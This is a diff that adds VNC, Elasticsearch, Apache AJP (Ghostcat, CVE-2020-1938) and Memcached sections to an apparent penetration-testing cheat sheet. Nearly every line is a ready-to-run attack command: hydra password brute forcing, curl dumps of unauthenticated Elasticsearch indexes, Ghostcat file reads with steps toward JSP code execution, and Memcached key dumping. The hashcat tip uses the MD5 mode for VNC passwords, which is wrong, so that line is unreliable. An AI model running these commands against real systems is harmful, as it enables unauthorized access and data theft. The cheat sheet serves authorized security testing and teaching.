@@ -484,3 +484,85 @@ db.<collection>.findOne()
 ```bash
 mongosh $IP:27017 -u admin -p 'password' --authenticationDatabase admin
 ```
+
+---
+
+## 5900 — VNC
+
+```bash
+nmap --script vnc-info,vnc-brute -p 5900 $IP
+
+# Brute force
+hydra -P /usr/share/wordlists/rockyou.txt $IP vnc -t 4
+
+# Connect
+vncviewer $IP
+vncviewer $IP::<port>    # alternate port
+
+# Metasploit scanner
+use auxiliary/scanner/vnc/vnc_login
+```
+
+> VNC password is max 8 characters — hashcat mask attack is fast: `hashcat -a 3 -m 0 hash ?a?a?a?a?a?a?a?a`
+
+---
+
+## 9200 / 9300 — Elasticsearch
+
+```bash
+# Unauthenticated — common on older installs (pre-8.0 had no auth by default)
+curl http://$IP:9200/
+curl http://$IP:9200/_cat/indices?v     # list indexes
+curl http://$IP:9200/_cat/nodes?v       # cluster nodes
+curl http://$IP:9200/<index>/_search    # dump index data
+curl http://$IP:9200/<index>/_search?size=1000&pretty
+
+# Get all documents from an index
+curl "http://$IP:9200/<index>/_search?q=*&pretty&size=100"
+
+# With auth (Elastic 8.x)
+curl -u elastic:password http://$IP:9200/
+```
+
+---
+
+## 8009 — Apache AJP (Ghostcat — CVE-2020-1938)
+
+```bash
+# Detect
+nmap -sV -p 8009 $IP
+
+# Ghostcat — read files from Tomcat webapp root via AJP (no auth)
+python3 ghostcat.py $IP    # reads /WEB-INF/web.xml by default
+python3 ghostcat.py $IP --file /WEB-INF/web.xml
+python3 ghostcat.py $IP --file /index.jsp
+
+# If file upload available — Ghostcat can include uploaded files as JSP → RCE
+# 1. Upload file containing JSP payload to any accessible upload location
+# 2. Include via Ghostcat: --file /path/to/uploaded/file
+```
+
+> PoC: [CNVD-2020-10487 / CVE-2020-1938](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ghostcat)
+
+---
+
+## 11211 — Memcached
+
+```bash
+# No auth by default
+telnet $IP 11211
+# Or:
+nc $IP 11211
+
+# Commands
+stats              # server info and stats
+stats slabs        # memory slabs
+stats items        # item counts per slab
+stats cachedump <slab_id> <limit>   # list keys in slab
+get <key>          # retrieve value
+```
+
+```bash
+# Dump all keys and values (automated)
+nmap --script memcached-info -p 11211 $IP
+```
